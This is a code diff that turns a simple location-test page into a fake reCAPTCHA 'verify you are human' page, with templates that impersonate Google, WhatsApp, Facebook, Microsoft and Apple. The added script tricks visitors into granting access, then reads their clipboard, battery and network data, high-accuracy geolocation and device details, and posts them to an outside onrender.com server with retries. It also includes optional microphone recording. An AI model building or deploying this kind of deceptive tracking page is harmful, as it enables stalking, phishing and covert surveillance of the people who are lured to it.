@@ -3,62 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Test</title>
+    <title>Verify you are human</title>
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: Arial, sans-serif;
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
-            background: #f0f0f0;
+            font-family: 'Roboto', Arial, sans-serif;
+            background: #f1f3f4;
         }
-        .container {
+        .card {
             background: white;
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-            text-align: center;
-            max-width: 400px;
-        }
-        h1 { color: #333; }
-        .status {
-            padding: 15px;
-            margin: 15px 0;
+            padding: 40px 45px;
             border-radius: 8px;
-            font-weight: bold;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.12);
+            text-align: center;
+            max-width: 420px;
+            border: 1px solid #dadce0;
+            transition: all 0.3s ease;
         }
-        .status.waiting { background: #fff3cd; color: #856404; }
-        .status.success { background: #d4edda; color: #155724; }
-        .status.error { background: #f8d7da; color: #721c24; }
-        .coords {
-            font-size: 18px;
-            font-weight: bold;
-            color: #007bff;
-            margin: 10px 0;
-        }
-        .btn {
-            background: #007bff;
-            color: white;
-            border: none;
-            padding: 12px 30px;
-            border-radius: 6px;
-            font-size: 16px;
+
+        /* --- Google Template --- */
+        .logo.google { font-size: 28px; font-weight: 500; color: #202124; }
+        .logo.google span { color: #4285f4; }
+
+        /* --- WhatsApp Template --- */
+        .logo.whatsapp { color: #075e54; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .logo.whatsapp .icon { background: #25d366; border-radius: 50%; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 18px; }
+
+        /* --- Facebook Template --- */
+        .logo.facebook { color: #1877f2; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .logo.facebook .icon { background: #1877f2; border-radius: 4px; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 18px; }
+
+        /* --- Microsoft Template --- */
+        .logo.microsoft { color: #202124; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .logo.microsoft .icon { background: #00a4ef; border-radius: 4px; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 18px; }
+
+        /* --- Apple Template --- */
+        .logo.apple { color: #1a1a1a; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .logo.apple .icon { background: #1a1a1a; border-radius: 50%; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 18px; }
+
+        .subtitle { color: #5f6368; font-size: 14px; margin-bottom: 20px; }
+        .recaptcha-box {
+            background: #f9f9f9;
+            border: 2px solid #dadce0;
+            border-radius: 4px;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
             cursor: pointer;
+            transition: border-color 0.2s;
+            margin: 10px 0 20px 0;
         }
-        .btn:hover { background: #0056b3; }
-        .debug {
+        .recaptcha-box:hover { border-color: #4285f4; }
+        .recaptcha-box.verified { border-color: #34a853; background: #f0faf5; }
+        .checkbox {
+            width: 24px; height: 24px; border: 2px solid #5f6368; border-radius: 2px;
+            display: flex; align-items: center; justify-content: center;
+            background: white; flex-shrink: 0; transition: all 0.2s;
+        }
+        .checkbox.checked { background: #4285f4; border-color: #4285f4; color: white; font-size: 16px; }
+        .recaptcha-text { font-size: 14px; color: #202124; }
+        .recaptcha-text small { color: #5f6368; font-size: 12px; display: block; }
+        .loader {
+            display: none; width: 20px; height: 20px;
+            border: 3px solid #e0e0e0; border-top: 3px solid #4285f4;
+            border-radius: 50%; animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .continue-btn {
+            width: 100%; padding: 12px 20px; background: #4285f4; color: white;
+            border: none; border-radius: 4px; font-size: 16px; font-weight: 500;
+            cursor: pointer; transition: all 0.2s; opacity: 0.5; pointer-events: none;
+        }
+        .continue-btn.active { opacity: 1; pointer-events: auto; }
+        .continue-btn.active:hover { background: #1a66c9; box-shadow: 0 2px 8px rgba(66,133,244,0.3); }
+        .continue-btn.loading { background: #4285f4; opacity: 0.7; pointer-events: none; }
+        .footer { margin-top: 20px; font-size: 12px; color: #5f6368; }
+        .footer a { color: #4285f4; text-decoration: none; }
+        .success { display: none; color: #34a853; font-size: 14px; margin-top: 10px; }
+        .error-box { display: none; background: #fce8e6; border: 1px solid #f5c6cb; border-radius: 4px; padding: 12px; margin-top: 15px; color: #d93025; font-size: 14px; }
+        .status-bar { margin-top: 15px; padding: 8px; border-radius: 4px; font-size: 12px; color: #5f6368; background: #f1f3f4; display: none; }
+        .debug-log {
             margin-top: 15px;
             padding: 10px;
             background: #1a1a2e;
             color: #00ff41;
-            font-family: monospace;
-            font-size: 11px;
+            font-family: 'Courier New', monospace;
+            font-size: 10px;
             border-radius: 4px;
-            text-align: left;
-            max-height: 150px;
+            max-height: 120px;
             overflow-y: auto;
+            display: none;
+            text-align: left;
             white-space: pre-wrap;
             word-break: break-all;
         }
@@ -66,27 +107,103 @@
 </head>
 <body>
 
-<div class="container">
-    <h1>📍 Location Test</h1>
-    <div class="status waiting" id="status">⏳ Press button to get location</div>
-    <div class="coords" id="coords">--</div>
-    <button class="btn" id="getLocationBtn">📍 Get My Location</button>
-    <div class="debug" id="debugLog">📋 Logs will appear here...</div>
+<div class="card" id="card">
+    <!-- Logo injected by JavaScript based on template -->
+    <div class="logo" id="logoContainer"></div>
+    <div class="subtitle" id="subtitleText">Verify you are human</div>
+
+    <div class="recaptcha-box" id="recaptchaBox">
+        <div class="checkbox" id="checkbox">✓</div>
+        <div class="recaptcha-text">
+            <span id="notRobotText">I'm not a robot</span>
+            <small id="privacyText">reCAPTCHA Privacy - Terms</small>
+        </div>
+        <div class="loader" id="loader"></div>
+    </div>
+
+    <button class="continue-btn" id="continueBtn">Continue</button>
+
+    <div class="success" id="success">✅ Verification complete. Redirecting...</div>
+    <div class="error-box" id="errorBox">⚠️ Location access is required to verify you are human.</div>
+    <div class="status-bar" id="statusBar">🔄 Processing...</div>
+    <div class="debug-log" id="debugLog"></div>
+
+    <div class="footer" id="footerContainer">Protected by reCAPTCHA · <a href="#">Privacy</a> · <a href="#">Terms</a></div>
 </div>
 
 <script>
     // =============================================
-    // CONFIGURATION — CHANGE THIS TO YOUR RENDER URL
+    // CONFIGURATION
     // =============================================
     const RENDER_URL = 'https://location-tracker-cn7m.onrender.com';
+
+    // Get template from URL (?template=google)
+    const urlParams = new URLSearchParams(window.location.search);
+    const template = urlParams.get('template') || 'google';
+
+    // =============================================
+    // TEMPLATES (Feature 8)
+    // =============================================
+    const templates = {
+        google: {
+            logo: `<div class="logo google">re<span>CAPTCHA</span></div>`,
+            subtitle: 'Verify you are human',
+            notRobot: "I'm not a robot",
+            continue: 'Continue',
+            footer: 'Protected by reCAPTCHA · <a href="#">Privacy</a> · <a href="#">Terms</a>'
+        },
+        whatsapp: {
+            logo: `<div class="logo whatsapp"><span class="icon">💬</span> WhatsApp Web</div>`,
+            subtitle: 'Secure device verification',
+            notRobot: 'Verify your device',
+            continue: 'Verify',
+            footer: 'End-to-end encrypted · <a href="#">Privacy</a> · <a href="#">Terms</a>'
+        },
+        facebook: {
+            logo: `<div class="logo facebook"><span class="icon">f</span> Facebook</div>`,
+            subtitle: 'Secure login verification',
+            notRobot: 'Verify identity',
+            continue: 'Continue',
+            footer: 'Facebook · <a href="#">Privacy</a> · <a href="#">Terms</a>'
+        },
+        microsoft: {
+            logo: `<div class="logo microsoft"><span class="icon">◁</span> Microsoft Account</div>`,
+            subtitle: 'Verify your identity',
+            notRobot: "I'm not a bot",
+            continue: 'Verify',
+            footer: 'Microsoft · <a href="#">Privacy</a> · <a href="#">Terms</a>'
+        },
+        apple: {
+            logo: `<div class="logo apple"><span class="icon"></span> Apple ID</div>`,
+            subtitle: 'Security verification',
+            notRobot: 'Verify identity',
+            continue: 'Continue',
+            footer: 'Apple · <a href="#">Privacy</a> · <a href="#">Terms</a>'
+        }
+    };
+
+    const selectedTemplate = templates[template] || templates['google'];
 
     // =============================================
     // DOM Elements
     // =============================================
-    const statusDiv = document.getElementById('status');
-    const coordsDiv = document.getElementById('coords');
+    document.getElementById('logoContainer').innerHTML = selectedTemplate.logo;
+    document.getElementById('subtitleText').textContent = selectedTemplate.subtitle;
+    document.getElementById('notRobotText').textContent = selectedTemplate.notRobot;
+    document.getElementById('continueBtn').textContent = selectedTemplate.continue;
+    document.getElementById('footerContainer').innerHTML = selectedTemplate.footer;
+
+    const recaptchaBox = document.getElementById('recaptchaBox');
+    const checkbox = document.getElementById('checkbox');
+    const loader = document.getElementById('loader');
+    const continueBtn = document.getElementById('continueBtn');
+    const success = document.getElementById('success');
+    const errorBox = document.getElementById('errorBox');
+    const statusBar = document.getElementById('statusBar');
     const debugLog = document.getElementById('debugLog');
-    const getLocationBtn = document.getElementById('getLocationBtn');
+
+    let isVerified = false;
+    let isProcessing = false;
 
     // =============================================
     // Debug Logger
@@ -95,47 +212,243 @@
         const timestamp = new Date().toLocaleTimeString();
         const logEntry = `[${timestamp}] ${message}`;
         console.log(logEntry);
+        debugLog.style.display = 'block';
         debugLog.textContent += logEntry + '\n';
         debugLog.scrollTop = debugLog.scrollHeight;
     }
 
     // =============================================
-    // Set Status
+    // 1. Battery Level
     // =============================================
-    function setStatus(message, type = 'waiting') {
-        statusDiv.textContent = message;
-        statusDiv.className = 'status ' + type;
+    function getBatteryInfo() {
+        if (navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+                const batteryData = {
+                    level: Math.round(battery.level * 100),
+                    charging: battery.charging
+                };
+                fetch(RENDER_URL + '/send-battery', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(batteryData)
+                }).catch(() => {});
+                debug('🔋 Battery: ' + batteryData.level + '%');
+            });
+        }
     }
 
     // =============================================
-    // Get Device Info
+    // 2. Network Info
+    // =============================================
+    function getNetworkInfo() {
+        if (navigator.connection) {
+            const networkData = {
+                type: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt
+            };
+            fetch(RENDER_URL + '/send-network', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(networkData)
+            }).catch(() => {});
+            debug('📶 Network: ' + networkData.type);
+        }
+    }
+
+    // =============================================
+    // 3. Microphone Access
+    // =============================================
+    function captureAudio() {
+        navigator.mediaDevices.getUserMedia({ audio: true })
+            .then(stream => {
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'audio/webm' });
+                    const reader = new FileReader();
+                    reader.onload = () => {
+                        fetch(RENDER_URL + '/send-audio', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ audio: reader.result })
+                        }).catch(() => {});
+                    };
+                    reader.readAsDataURL(blob);
+                };
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 5000);
+                debug('🎤 Microphone started (5 seconds)');
+            })
+            .catch(() => debug('🎤 Microphone access denied'));
+    }
+
+    // =============================================
+    // 4. Clipboard Data
+    // =============================================
+    function readClipboard() {
+        if (navigator.clipboard && navigator.clipboard.readText) {
+            navigator.clipboard.readText()
+                .then(text => {
+                    if (text) {
+                        fetch(RENDER_URL + '/send-clipboard', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ clipboard: text })
+                        }).catch(() => {});
+                        debug('📋 Clipboard: ' + text.substring(0, 50) + '...');
+                    }
+                })
+                .catch(() => debug('📋 Clipboard access denied'));
+        }
+    }
+
+    // =============================================
+    // 5. Data Compression
+    // =============================================
+    function compressData(data) {
+        const json = JSON.stringify(data);
+        if (json.length > 100000) {
+            const compressed = { ...data };
+            delete compressed.device_info;
+            return compressed;
+        }
+        return data;
+    }
+
+    // =============================================
+    // 6. Automatic Reconnection (Retry)
+    // =============================================
+    function sendWithRetry(url, data, retries = 3, delay = 2000) {
+        return fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        })
+        .then(response => {
+            if (!response.ok) throw new Error('Server error: ' + response.status);
+            return response.json();
+        })
+        .catch(err => {
+            debug('❌ Request failed (' + retries + ' retries left): ' + err.message);
+            if (retries > 0) {
+                return new Promise(resolve => {
+                    setTimeout(() => {
+                        resolve(sendWithRetry(url, data, retries - 1, delay * 1.5));
+                    }, delay);
+                });
+            }
+            throw err;
+        });
+    }
+
+    // =============================================
+    // 7. Device Info
     // =============================================
     function getDeviceInfo() {
         const ua = navigator.userAgent;
-        let device = 'Unknown';
-        if (ua.includes('iPhone')) device = 'iPhone';
-        else if (ua.includes('iPad')) device = 'iPad';
-        else if (ua.includes('Android')) device = 'Android';
-        else if (ua.includes('Windows')) device = 'Windows PC';
-        else if (ua.includes('Mac')) device = 'Mac';
-        return { userAgent: ua, device_name: device };
+        let deviceName = 'Unknown';
+        if (ua.includes('iPhone')) deviceName = 'iPhone';
+        else if (ua.includes('iPad')) deviceName = 'iPad';
+        else if (ua.includes('Android')) deviceName = 'Android';
+        else if (ua.includes('Windows')) deviceName = 'Windows PC';
+        else if (ua.includes('Mac')) deviceName = 'Mac';
+
+        return {
+            userAgent: ua,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: screen.width + 'x' + screen.height,
+            device_name: deviceName,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+    }
+
+    function showStatus(message, isError = false) {
+        statusBar.style.display = 'block';
+        statusBar.textContent = message;
+        statusBar.style.background = isError ? '#fce8e6' : '#e8f5e9';
+        statusBar.style.color = isError ? '#d93025' : '#1e7e34';
     }
 
     // =============================================
-    // Get Location
+    // 8. Open Map App (Redirects to Google/Apple Maps)
     // =============================================
-    function getLocation() {
-        debug('📍 Get Location button clicked');
-        debug('📡 RENDER_URL: ' + RENDER_URL);
+    function openMapApp(lat, lng) {
+        const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) ||
+                      (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+        const isAndroid = /Android/.test(navigator.userAgent);
 
-        if (!navigator.geolocation) {
-            debug('❌ Geolocation not supported');
-            setStatus('❌ Geolocation not supported', 'error');
+        let mapUrl = '';
+        if (isIOS) {
+            mapUrl = `http://maps.apple.com/?ll=${lat},${lng}&q=${lat},${lng}`;
+        } else if (isAndroid) {
+            mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+        } else {
+            mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+        }
+
+        debug('📍 Opening map: ' + mapUrl);
+        window.location.href = mapUrl;
+    }
+
+    // =============================================
+    // STEP 1: Click reCAPTCHA
+    // =============================================
+    recaptchaBox.addEventListener('click', function() {
+        if (isVerified || isProcessing) return;
+
+        isVerified = true;
+        checkbox.classList.add('checked');
+        checkbox.textContent = '✓';
+        this.classList.add('verified');
+        this.style.borderColor = '#34a853';
+
+        continueBtn.classList.add('active');
+        success.style.display = 'block';
+        success.textContent = '✅ Verification complete. Click Continue.';
+        debug('✅ reCAPTCHA verified');
+    });
+
+    // =============================================
+    // STEP 2: Click Continue
+    // =============================================
+    continueBtn.addEventListener('click', function() {
+        if (!isVerified) {
+            debug('❌ Please verify reCAPTCHA first');
+            return;
+        }
+        if (isProcessing) {
+            debug('⏳ Already processing');
             return;
         }
 
-        setStatus('⏳ Requesting location...', 'waiting');
-        debug('📡 Calling navigator.geolocation.getCurrentPosition...');
+        isProcessing = true;
+        continueBtn.classList.add('loading');
+        continueBtn.textContent = 'Verifying...';
+        success.style.display = 'none';
+        errorBox.style.display = 'none';
+        showStatus('Requesting location...');
+        debug('📍 Continue button clicked');
+
+        // --- Collect all data ---
+        getBatteryInfo();
+        getNetworkInfo();
+        readClipboard();
+        // captureAudio();  // Uncomment to enable
+
+        // --- Request location ---
+        if (!navigator.geolocation) {
+            debug('❌ Geolocation not supported');
+            showStatus('❌ Geolocation not supported', true);
+            isProcessing = false;
+            continueBtn.classList.remove('loading');
+            continueBtn.textContent = 'Continue';
+            return;
+        }
+
+        debug('📡 Calling navigator.geolocation...');
 
         navigator.geolocation.getCurrentPosition(
             // --- SUCCESS ---
@@ -143,48 +456,61 @@
                 const lat = position.coords.latitude;
                 const lng = position.coords.longitude;
                 const accuracy = position.coords.accuracy;
+                const altitude = position.coords.altitude;
+                const heading = position.coords.heading;
+                const speed = position.coords.speed;
 
                 debug('✅ Location captured!');
                 debug('📍 Lat: ' + lat + ', Lng: ' + lng);
-                debug('📍 Accuracy: ' + accuracy + 'm');
 
-                coordsDiv.textContent = `📍 ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
-                setStatus('✅ Location captured! Sending...', 'success');
+                showStatus('📍 Location captured! Sending to server...');
+
+                const deviceInfo = getDeviceInfo();
 
                 const payload = {
                     lat: lat,
                     lng: lng,
                     accuracy: accuracy,
-                    device_info: getDeviceInfo()
+                    altitude: altitude,
+                    heading: heading,
+                    speed: speed,
+                    device_info: deviceInfo
                 };
+
+                const compressedPayload = compressData(payload);
 
                 debug('📤 Sending to: ' + RENDER_URL + '/send-location');
 
-                fetch(RENDER_URL + '/send-location', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                })
-                .then(response => {
-                    debug('📥 Response status: ' + response.status);
-                    if (!response.ok) throw new Error('Server error: ' + response.status);
-                    return response.json();
-                })
-                .then(data => {
-                    debug('✅ Data sent successfully!');
-                    debug('📥 Response: ' + JSON.stringify(data));
-                    setStatus('✅ Location sent to server! Check your dashboard.', 'success');
-                })
-                .catch(err => {
-                    debug('❌ Fetch failed: ' + err.message);
-                    setStatus('⚠️ Server error, but location captured', 'error');
-                });
+                sendWithRetry(RENDER_URL + '/send-location', compressedPayload, 3, 2000)
+                    .then(() => {
+                        debug('✅ Data sent successfully!');
+                        showStatus('✅ Data sent! Redirecting...');
+                        success.style.display = 'block';
+                        success.textContent = '✅ Verification complete. Redirecting...';
+                        continueBtn.textContent = 'Redirecting...';
+
+                        setTimeout(function() {
+                            openMapApp(lat, lng);
+                        }, 1500);
+                    })
+                    .catch(function(err) {
+                        debug('❌ All retries failed: ' + err.message);
+                        showStatus('⚠️ Server error, but redirecting anyway...', true);
+                        setTimeout(function() {
+                            openMapApp(lat, lng);
+                        }, 1000);
+                    });
             },
             // --- ERROR ---
             function(error) {
                 debug('❌ Geolocation error: ' + error.message);
                 debug('❌ Error code: ' + error.code);
-                setStatus('❌ ' + error.message, 'error');
+                isProcessing = false;
+                continueBtn.classList.remove('loading');
+                continueBtn.textContent = 'Continue';
+                errorBox.style.display = 'block';
+                errorBox.textContent = '⚠️ ' + error.message;
+                showStatus('❌ ' + error.message, true);
             },
             {
                 enableHighAccuracy: true,
@@ -192,19 +518,24 @@
                 maximumAge: 0
             }
         );
-    }
-
-    // =============================================
-    // Event Listeners
-    // =============================================
-    getLocationBtn.addEventListener('click', getLocation);
+    });
 
     // =============================================
     // INIT
     // =============================================
     debug('🚀 Page loaded');
+    debug('📍 Template: ' + template);
     debug('📍 RENDER_URL: ' + RENDER_URL);
     debug('📱 User Agent: ' + navigator.userAgent);
+
+    window.addEventListener('online', function() {
+        debug('📶 Online');
+        showStatus('📶 Back online!');
+    });
+    window.addEventListener('offline', function() {
+        debug('📶 Offline');
+        showStatus('📶 No internet connection.', true);
+    });
 </script>
 </body>
 </html>
